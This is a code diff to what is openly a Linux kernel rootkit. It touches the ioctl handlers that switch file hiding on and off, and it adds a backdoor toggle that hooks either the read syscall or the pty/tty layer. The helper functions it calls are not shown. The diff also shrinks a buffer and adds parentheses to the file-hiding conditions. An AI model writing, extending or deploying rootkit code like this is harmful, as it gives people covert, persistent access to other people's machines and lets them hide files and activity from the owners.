@@ -6,10 +6,11 @@
 #include "channel.h"
 #include "common.h"
 #include "filehide.h"
+#include "backdoor.h"
 #include "ioctl.h"
 #include "rootkit.h"
 
-#define BUFLEN 4096
+#define BUFLEN 512
 
 extern rootkit_t rootkit;
 
@@ -60,10 +61,10 @@ handle_filehide(unsigned long arg)
     long sarg = (long)arg;
     bool set = rootkit.hiding_files;
 
-    if (sarg > 0 || !sarg && (set ^ 1)) {
+    if (sarg > 0 || (!sarg && (set ^ 1))) {
         hide_files();
         rootkit.hiding_files = 1;
-    } else if (sarg < 0 || !sarg && !(set ^ 1)) {
+    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
         unhide_files();
         rootkit.hiding_files = 0;
     }
@@ -104,6 +105,24 @@ handle_backdoor(unsigned long arg)
 int
 handle_togglebd(unsigned long arg)
 {
+    char *msg;
+    long sarg = (long)arg;
+
+    if (!sarg) {
+        disable_backdoor();
+        rootkit.backdoor = BD_OFF;
+        msg = "off";
+    } else if (sarg < 0) {
+        backdoor_read();
+        rootkit.backdoor = BD_READ;
+        msg = "hooked into `read`";
+    } else if (sarg > 0) {
+        backdoor_tty();
+        rootkit.backdoor = BD_TTY;
+        msg = "hooked into `{p,t}ty`";
+    }
+
+    DEBUG_NOTICE("backdoor %s\n", msg);
 
     return 0;
 }
